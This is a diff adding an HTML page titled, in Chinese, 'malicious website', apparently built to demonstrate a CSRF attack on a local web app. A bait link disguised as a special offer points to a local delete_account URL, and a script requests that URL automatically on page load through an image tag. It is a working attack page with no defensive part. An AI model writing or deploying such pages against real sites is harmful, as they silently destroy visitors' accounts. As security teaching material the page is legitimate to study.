@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>恶意网站</title>
+</head>
+<body>
+    <h1>欢迎访问恶意网站</h1>
+    <p>请查看我们的最新优惠！</p>
+
+    <!-- 恶意链接，诱使受害者点击，发起 GET 请求来删除用户帐户 -->
+    <a href="http://127.0.0.1:8000/users/delete_account/" id="delete-account-link">最新优惠政策</a>
+
+    <script>
+        // 自动触发 GET 请求，模拟 CSRF 攻击
+        window.onload = function() {
+            var img = new Image();
+            img.src = "http://127.0.0.1:8000/users/delete_account/"; // 请求 URL
+        };
+    </script>
+</body>
+</html>
